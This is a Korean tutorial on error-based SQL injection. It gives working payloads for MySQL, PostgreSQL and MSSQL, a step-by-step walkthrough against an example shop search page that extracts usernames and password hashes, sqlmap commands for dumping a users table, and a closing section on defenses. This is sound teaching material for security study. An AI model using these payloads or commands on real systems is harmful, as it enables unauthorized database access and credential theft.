Error-based SQL Injection

Error-based SQLi는 데이터베이스 에러 메시지를 통해 정보를 추출하는 In-band SQL Injection 기법입니다.

개념 (Concept)​

Error-based SQLi란?​

Error-based SQL Injection은 의도적으로 SQL 에러를 발생시켜, 에러 메시지에 포함된 데이터베이스 정보를 추출하는 기법입니다.

작동 원리:

1. 악의적인 SQL 쿼리로 에러 유발
2. DBMS가 에러 메시지에 쿼리 결과 포함
3. 웹 페이지에 표시된 에러 메시지에서 정보 획득

공격 조건:

  • ✅ 데이터베이스 에러 메시지가 웹 페이지에 표시되어야 함
  • ✅ DBMS가 에러 메시지에 데이터를 포함할 수 있어야 함

왜 Error-based를 사용하는가?​

사용 시나리오:

  1. 쿼리 결과가 페이지에 출력되지 않을 때: Union-based가 불가능한 상황
  2. 빠른 정보 수집이 필요할 때: 단일 요청으로 DB명, 버전 등 확인
  3. 초기 정찰 단계: 어떤 DBMS를 사용하는지 파악

장단점:

장점단점
빠른 데이터 추출에러 메시지 노출 필요
단일 요청으로 정보 획득추출 가능한 데이터 길이 제한 (보통 64자)
Union-based보다 간단최신 웹앱에서는 에러 숨김 추세

MySQL Error-based 기법​

1. ExtractValue 함수 (가장 많이 사용)​

원리: XPATH 문법 에러를 이용하여 데이터 추출

기본 구문:

AND extractvalue(1, concat(0x7e, (서브쿼리), 0x7e))

0x7e의 의미:

  • 16진수로 ~ (틸드) 문자
  • 데이터를 눈에 잘 띄게 구분하기 위해 사용
  • 에러 메시지에서 추출한 데이터를 쉽게 식별 가능

실전 예시:

-- 현재 데이터베이스명 추출
' AND extractvalue(1, concat(0x7e, database(), 0x7e))--

-- MySQL 버전 추출
' AND extractvalue(1, concat(0x7e, version(), 0x7e))--

-- 현재 사용자 추출
' AND extractvalue(1, concat(0x7e, user(), 0x7e))--

-- 테이블명 추출
' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))--

에러 메시지 예시:

XPATH syntax error: '~testdb~'
XPATH syntax error: '~5.7.31-0ubuntu0.18.04.1~'
XPATH syntax error: '~root@localhost~'

2. UpdateXML 함수​

원리: ExtractValue와 동일하게 XPATH 에러 이용

기본 구문:

AND updatexml(1, concat(0x7e, (서브쿼리), 0x7e), 1)

실전 예시:

' AND updatexml(1, concat(0x7e, database(), 0x7e), 1)--
' AND updatexml(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e), 1)--

언제 UpdateXML을 사용하나?

  • ExtractValue가 차단되었을 때 대체 수단
  • 두 함수의 작동 방식은 거의 동일

3. FLOOR + RAND 함수​

원리: 중복 키 에러를 이용

기본 구문:

AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((서브쿼리), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)

실전 예시:

' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--

에러 메시지:

Duplicate entry 'testdb1' for key 'group_key'

언제 FLOOR+RAND를 사용하나?

  • ExtractValue/UpdateXML 함수가 모두 차단되었을 때
  • 오래된 MySQL 버전에서 더 안정적으로 작동

PostgreSQL Error-based 기법​

CAST 함수​

원리: 데이터 타입 변환 실패로 에러 발생

기본 구문:

AND 1=CAST((서브쿼리) AS INTEGER)

실전 예시:

' AND 1=CAST((SELECT version()) AS INTEGER)--
' AND 1=CAST((SELECT current_database()) AS INTEGER)--

에러 메시지:

ERROR: invalid input syntax for integer: "PostgreSQL 12.3 on x86_64-pc-linux-gnu"

MSSQL Error-based 기법​

CONVERT 함수​

원리: 문자열을 정수로 변환하면서 에러 발생

기본 구문:

AND 1=CONVERT(int, (서브쿼리))

실전 예시:

' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, DB_NAME())--

에러 메시지:

Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019' to data type int.

실전 공격 시나리오​

시나리오: 쇼핑몰 상품 검색 페이지​

취약한 URL:

http://shop.example.com/search.php?keyword=laptop

1단계: 취약점 탐지

http://shop.example.com/search.php?keyword=laptop'

응답 (에러 발생):

MySQL Error: You have an error in your SQL syntax near 'laptop'' at line 1

→ MySQL을 사용하고 있으며, 에러 메시지가 노출됨

2단계: DB명 추출

laptop' AND extractvalue(1, concat(0x7e, database(), 0x7e))--

에러 메시지:

XPATH syntax error: '~shop_db~'

→ 데이터베이스명: shop_db

3단계: 테이블명 추출

laptop' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='shop_db' LIMIT 0,1), 0x7e))--

에러 메시지:

XPATH syntax error: '~users~'

4단계: 컬럼명 추출

laptop' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))--

에러 메시지:

XPATH syntax error: '~username~'

5단계: 데이터 추출

laptop' AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT 0,1), 0x7e))--

에러 메시지:

XPATH syntax error: '~admin~'

SQLMap을 이용한 Error-based 공격​

기본 스캔​

sqlmap -u "http://shop.example.com/search.php?keyword=laptop" --technique=E --batch

옵션 설명:

  • --technique=E: Error-based만 사용
  • --batch: 모든 질문에 기본값으로 자동 응답

현재 DB 정보 추출​

sqlmap -u "http://shop.example.com/search.php?keyword=laptop" --technique=E --current-db

출력 예시:

[INFO] the back-end DBMS is MySQL
[INFO] fetching current database
current database: 'shop_db'

테이블 나열​

sqlmap -u "http://shop.example.com/search.php?keyword=laptop" --technique=E -D shop_db --tables

데이터 덤프​

sqlmap -u "http://shop.example.com/search.php?keyword=laptop" --technique=E -D shop_db -T users --dump

데이터 길이 제한 우회​

문제점​

ExtractValue/UpdateXML은 최대 32자까지만 에러 메시지에 표시됩니다.

긴 데이터 예시:

admin:5f4dcc3b5aa765d61d8327deb882cf99

→ 32자를 초과하므로 잘림

해결 방법: SUBSTRING 사용​

1-32번째 문자 추출:

' AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(password, 1, 32) FROM users LIMIT 0,1), 0x7e))--

33-64번째 문자 추출:

' AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(password, 33, 32) FROM users LIMIT 0,1), 0x7e))--

여러 행 추출: LIMIT 활용​

-- 첫 번째 사용자
' AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT 0,1), 0x7e))--

-- 두 번째 사용자
' AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT 1,1), 0x7e))--

-- 세 번째 사용자
' AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT 2,1), 0x7e))--

방어 기법​

1. Prepared Statements 사용​

// 취약한 코드
$query = "SELECT * FROM products WHERE name = '" . $_GET['keyword'] . "'";

// 안전한 코드
$stmt = $pdo->prepare("SELECT * FROM products WHERE name = ?");
$stmt->execute([$_GET['keyword']]);

2. 에러 메시지 숨기기​

// PHP 설정
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
# Python Flask
app.config['PROPAGATE_EXCEPTIONS'] = False

3. 사용자 정의 에러 페이지​

try {
    // 데이터베이스 쿼리
} catch (Exception $e) {
    // 에러 로그 기록
    error_log($e->getMessage());

    // 일반적인 에러 메시지만 표시
    die("An error occurred. Please try again later.");
}
